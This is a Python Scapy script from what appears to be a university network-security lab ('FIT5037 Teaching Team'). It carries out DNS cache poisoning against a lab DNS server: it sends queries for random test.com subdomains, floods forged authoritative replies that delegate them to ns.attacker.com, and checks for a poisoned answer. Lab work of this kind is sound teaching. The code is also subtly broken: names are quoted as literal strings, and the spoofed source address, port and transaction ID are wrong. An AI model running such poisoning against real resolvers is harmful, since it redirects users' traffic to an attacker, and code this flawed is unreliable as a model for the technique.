#! usr/bin/python3
#FIT5037 Teaching Team
from scapy.all import *
import random

#### ATTACK CONFIGURATION ####
ATTEMPT_NUM = 10000
dummy_domain_lst = []

#IP of our attacker's machine
attacker_ip = "10.10.10.198"     #complete attacker's IP

#IP of our victim's dns server
target_dns_ip =  "10.10.5.53"  #complete DNS server's IP

#DNS Forwarder if local couldnt resolve
#or real DNS of the example.com
forwarder_dns = "8.8.8.8"

#dummy domains to ask the server to query
dummy_domain_prefix = "abcdefghijklmnopqrstuvwxy0987654321"
base_domain = ".test.com"

#target dns port
target_dns_port = 33333

# Step 1 : create a for loop to generate dummy hostnames based on ATTEMPT_NUM
# each dummy host should concat random substrings in dummy_domain_prefix and base_domain
def get_random_str(main_dummy_domain, dummy_domain_length):
    d_name = random.randrange(0, len(main_dummy_domain) - dummy_domain_length + 1)
    return main_dummy_domain[d_name : (d_name+dummy_domain_length)]

for i in range(ATTEMPT_NUM):
    d_name_prefix = (get_random_str(dummy_domain_prefix, 5))
    domains = d_name_prefix + base_domain
    dummy_domain_lst.append(domains)

#Your code goes here to generate 10000 dummy hostnames

print("Completed generating dummy domains")

#### ATTACK SIMULATION

for i in range(0,ATTEMPT_NUM):
    cur_domain = dummy_domain_lst[i]
    print("> url: " + cur_domain)

    ###### Step 2 : Generate a random DNS query for cur_domain to challenge the local DNS

    # attacker_ip and target_dns_ip is per-defined in the code
    IPpkt = IP(dst=target_dns_ip, src=attacker_ip)
    UDPpkt = UDP(dport=53, sport=33333)
    DNSpkt = DNS(id=random.randint(1000, 62000 ), qr=0, qdcount=1, ancount=0, nscount=0, arcount=0, qd=DNSQR(qname="cur_domain"))

    query_pkt = IPpkt/UDPpkt/DNSpkt
    send(query_pkt,verbose=0)

    ###### Step 3 : For that DNS query, generate 100 random guesses with random transactionID
    # to spoof the response packet

    for i in range(100):
        tran_id = random.randint(1000, 62000)

        IPpkt = IP(dst=target_dns_ip, src=attacker_ip)  # Your code goes here ??
        UDPpkt = UDP(dport=53, sport=33333)  # Your code goes here ??
        # The Answer Section
        Anssec = DNSRR(rrname="cur_domain", type='A', ttl=303030, rdata='10.0.0.123')

        # The Authority Section
        NSsec = DNSRR(rrname="cur_domain", type="NS", rdata="ns.attacker.com", ttl=900000)

        # The Additional Section
        Addsec = DNSRR(rrname="ns.attacker.com", type="A", rdata="10.10.10.123", ttl=900000)

        # Construct the DNS packet
        DNSpkt = DNS(id=random.randint(1000, 62000), qd=DNSQR(qname="cur_domain"), aa=1, rd=0, qr=1, qdcount=1, ancount=1, nscount=1, arcount=1,
                     an=Anssec, ns=NSsec, ar=Addsec)

        response_pkt = IPpkt/UDPpkt/DNSpkt
        send(response_pkt,verbose=0)

    ####### Step 4 : Verify the result by sending a DNS query to the server
    # and double check whether the Answer Section returns the IP of the attacker (i.e. attacker_ip)
    IPpkt = IP(dst=target_dns_ip)
    UDPpkt = UDP(sport=random.randint(1025,65000),dport =53)
    DNSpkt = DNS(id=99,rd=1,qd=DNSQR(qname=cur_domain))

    query_pkt = IPpkt/UDPpkt/DNSpkt
    z = sr1(query_pkt,timeout=2,retry=0,verbose=0)
    try:
        if(z[DNS].an.rdata == attacker_ip):
                print("Poisonned the victim DNS server successfully.")
                break
    except:
             print("Poisonning failed")

#### END ATTACK SIMULATION

